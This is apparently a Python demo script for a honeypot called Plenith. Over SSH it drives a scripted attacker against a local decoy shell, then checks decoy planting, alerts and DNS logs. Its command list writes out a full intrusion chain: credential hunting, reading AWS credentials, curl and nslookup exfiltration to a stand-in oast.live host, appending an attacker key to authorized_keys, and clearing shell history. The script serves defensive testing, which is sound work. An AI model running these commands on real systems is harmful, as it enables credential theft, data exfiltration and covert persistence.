"""End-to-end demo: drive a scripted attacker through the proxy and report.

Runs a realistic compromise sequence over SSH (recon -> credential hunt ->
decoy swallow -> lateral -> exfil -> persistence -> cleanup) and prints
the resulting alerts + a verification that rotated content was planted.

This is the "let's test it" demo for the locked-down + rotated fabric.
"""
import asyncio
import json
import os
import re
import sys
import time
from pathlib import Path

import asyncssh

# Sequence of commands a typical attacker runs once they have shell. The
# orderly walk-through fires every major heuristic, plants the rotated
# decoys, attempts lateral SSH to a decoy hostname, attempts DNS exfil,
# attempts persistence, and tries log cleanup.
_ATTACK_SCRIPT = [
    # Recon
    ("whoami",                                                  "recon"),
    ("id",                                                      "recon"),
    ("hostname",                                                "recon"),
    ("uname -a",                                                "recon"),
    ("ls -la /home/jdoe",                                       "recon"),
    # Credential hunt — should fire alert_credential_search (medium)
    ("find / -name id_rsa 2>/dev/null",                         "cred-hunt"),
    ("grep -r AKIA /home/jdoe 2>/dev/null",                     "cred-hunt"),
    # Read the real-looking ~/.aws/credentials honeytoken
    ("cat /home/jdoe/.aws/credentials",                         "cred-read"),
    # Trigger plant_sudo_vulnerability via sudo -l
    ("sudo -l",                                                 "plant-trigger"),
    # Then read the planted decoy — should fire alert_decoy_swallowed
    # (medium) AND the body should be the ROTATED Vertex-Labs version
    ("ls /etc/sudoers.d/",                                      "decoy-discovery"),
    ("cat /etc/sudoers.d/zzz_compat",                           "decoy-swallow"),
    # Trigger spawn_fake_mysql via a probe
    ("mysql -u root -p",                                        "plant-trigger"),
    # Read the rotated my.cnf
    ("cat /etc/mysql/my.cnf",                                   "decoy-swallow"),
    # Lateral movement attempt to one of the decoy hostnames the corp
    # identity randomly chose (we use a generic name; the heuristic also
    # catches db-prod-01 / api-prod-03 / bastion-prod since they're the
    # Plenith in-fabric hostnames).
    ("ssh db-prod-01",                                          "lateral"),
    # DNS exfil attempt — heuristic catches this at the bash level
    ("curl https://attacker.x.oast.live/$(whoami)",             "exfil-bash"),
    # ALSO drive a direct nslookup so CoreDNS itself records the query.
    # This exercises the §4.2 DNS-exfil detection wire end-to-end.
    ("nslookup AAAABASE64BLOB.exfil.x.oast.live 172.30.0.40",   "exfil-dns"),
    # SSH persistence
    ("echo 'ssh-rsa AAAA...attacker@evil' >> /home/jdoe/.ssh/authorized_keys", "persist"),
    # Log tampering
    ("history -c",                                              "cleanup"),
    ("exit",                                                    "leave"),
]

PROXY_HOST = "127.0.0.1"
PROXY_PORT = 22000
USERNAME = "jdoe"
PASSWORD = "x"  # any value — Plenith accepts on first connect

def color(code: str, s: str) -> str:
    return f"\033[{code}m{s}\033[0m"

_PROMPT_RE = re.compile(r"\$\s*$")

async def _read_until_prompt(proc, buf: list, max_wait: float) -> None:
    """Read stdout until the bash prompt re-appears at the end OR until
    `max_wait` seconds elapse. Appends every chunk to `buf` (caller
    concatenates). The orchestrator can be slow (LLM round-trip) — 8s is
    a generous upper bound per command."""
    deadline = asyncio.get_event_loop().time() + max_wait
    while True:
        timeout = max(0.05, deadline - asyncio.get_event_loop().time())
        try:
            chunk = await asyncio.wait_for(proc.stdout.read(4096), timeout=timeout)
        except (TimeoutError, asyncssh.misc.ConnectionLost):
            return
        if not chunk:
            return
        text = chunk if isinstance(chunk, str) else chunk.decode("utf-8", "replace")
        buf.append(text)
        # Trailing prompt detection: the orchestrator emits "user@host:cwd$ "
        # at the end of every command response. We scan the tail for `$ `.
        tail = "".join(buf)[-200:]
        if _PROMPT_RE.search(tail.rstrip()) or tail.rstrip().endswith("$"):
            return

async def run_attack_script() -> str:
    """Execute the attack sequence and return the captured terminal output."""
    print(color("36", f"[*] connecting to proxy {PROXY_HOST}:{PROXY_PORT} as {USERNAME}"))
    async with asyncssh.connect(
        PROXY_HOST, port=PROXY_PORT, username=USERNAME, password=PASSWORD,
        known_hosts=None, client_keys=None,
    ) as conn:
        proc = await conn.create_process(term_type="xterm")
        buf: list = []
        # Wait for the initial banner + prompt
        await _read_until_prompt(proc, buf, max_wait=4.0)

        for cmd, tag in _ATTACK_SCRIPT:
            t0 = time.perf_counter()
            print(color("33", f"  > [{tag}] {cmd}"), end="", flush=True)
            proc.stdin.write(cmd + "\n")
            # Generous wait — some commands hit the LLM (slow), some are
            # cache-fast. `exit` closes the session before any prompt
            # re-appears, so cap the wait.
            wait = 1.5 if cmd == "exit" else 12.0
            await _read_until_prompt(proc, buf, max_wait=wait)
            dt = time.perf_counter() - t0
            print(color("90", f"   ({dt:.1f}s)"))

        # Final drain — anything still buffered
        try:
            await asyncio.wait_for(proc.wait(), timeout=2)
        except TimeoutError:
            pass
        return "".join(buf)

def verify_planted_decoys(transcript: str) -> dict:
    """Inspect the transcript for evidence of rotated decoys."""
    # Expected markers from the Vertex Labs identity for this deployment
    expected = {
        "rotated_sudoers_marker": "vertex.corp",
        "rotated_mysql_marker_a": "med_ops",
        "rotated_mysql_marker_b": "Audit2026@_v2",
        "rotated_decoy_host_a": "stage-db-04",
        "rotated_decoy_host_b": "stage-api-06",
        "rotated_decoy_host_c": "stage-bastion-08",
        "pre_rotation_static_marker": "M3taD4ta!2026",
        "pre_rotation_static_marker_2": "ansible role ops.legacy-compat v1.7.3",
    }
    out = {}
    out["rotated_sudoers_planted"] = expected["rotated_sudoers_marker"] in transcript
    out["rotated_mysql_planted"]   = (
        expected["rotated_mysql_marker_a"] in transcript
        or expected["rotated_mysql_marker_b"] in transcript
    )
    out["static_defaults_absent"]  = (
        expected["pre_rotation_static_marker"] not in transcript
        and expected["pre_rotation_static_marker_2"] not in transcript
    )
    return out

def summarize_dns_exfil_captures() -> list:
    """Grab the latest DNS log lines that show external lookups (exfil)."""
    import subprocess
    out = subprocess.run(
        ["docker", "logs", "--tail", "200", "plenith-dns"],
        capture_output=True, text=True, timeout=10,
    )
    lines = (out.stdout + out.stderr).splitlines()
    exfil = [l for l in lines if "NXDOMAIN" in l or "SERVFAIL" in l]
    return exfil[-15:]

def summarize_state(state_dir: Path) -> dict:
    """Read the StateStore JSONs for our attacker IP and return the alerts."""
    if not state_dir.exists():
        return {"error": f"no state dir at {state_dir}"}
    files = sorted(state_dir.glob("*.json"))
    if not files:
        return {"warning": f"no state files yet (waiting for orchestrator)"}
    # Find the most recently-modified one for our jdoe attacker
    latest = max(files, key=lambda p: p.stat().st_mtime)
    data = json.loads(latest.read_text(encoding="utf-8"))
    observed = data.get("observed", {})
    alerts_per_engagement = []
    # Walk the logs dir for actions_taken
    logs_dir = state_dir.parent / "logs"
    actions = []
    if logs_dir.exists():
        for sub in logs_dir.iterdir():
            for log in sub.rglob("*.json"):
                try:
                    d = json.loads(log.read_text(encoding="utf-8"))
                except (OSError, json.JSONDecodeError):
                    continue
                for a in d.get("actions_taken", []):
                    actions.append(a.get("action"))
    return {
        "state_file": str(latest),
        "engagement_id": data.get("engagement_id", "?")[:8],
        "connection_count": data.get("connection_count"),
        "observed_summary": {
            k: (sorted(v) if isinstance(v, list) else v)
            for k, v in observed.items()
            if v and k != "alerted_reverse_shell"
        },
        "actions_fired": sorted(set(actions)),
    }

def main():
    # The state dir is `state-docker/` per docker-compose.yml.
    repo_root = Path(__file__).resolve().parent.parent.parent
    state_dir = repo_root / "state-docker" / "persistence"

    print(color("1;36", "\n=== Plenith E2E demo: locked-down + rotated fabric ==="))
    print(color("36", f"  proxy:     {PROXY_HOST}:{PROXY_PORT}"))
    print(color("36", f"  state:     {state_dir}"))
    print()

    transcript = asyncio.run(run_attack_script())

    print()
    print(color("1", "── Decoy plant verification ──"))
    plant_results = verify_planted_decoys(transcript)
    for k, v in plant_results.items():
        marker = color("32", "PASS") if v else color("31", "FAIL")
        print(f"  {marker}  {k}")

    print()
    print(color("1", "── Engagement state ──"))
    time.sleep(1.0)  # let state writer flush
    state = summarize_state(state_dir)
    print(json.dumps(state, indent=2, sort_keys=True))

    print()
    print(color("1", "── DNS exfil log (last 15 NXDOMAIN/SERVFAIL) ──"))
    for line in summarize_dns_exfil_captures():
        # Highlight our attacker-targeted oast.live queries
        if "oast" in line or "burpcollab" in line:
            print(color("33", f"  ★ {line}"))
        else:
            print(f"    {line}")

    print()
    # Save the captured transcript for inspection
    out_path = Path("state/demo_attack_transcript.txt")
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(transcript, encoding="utf-8")
    print(color("36", f"[*] full transcript saved to {out_path}"))

    return 0

if __name__ == "__main__":
    raise SystemExit(main())
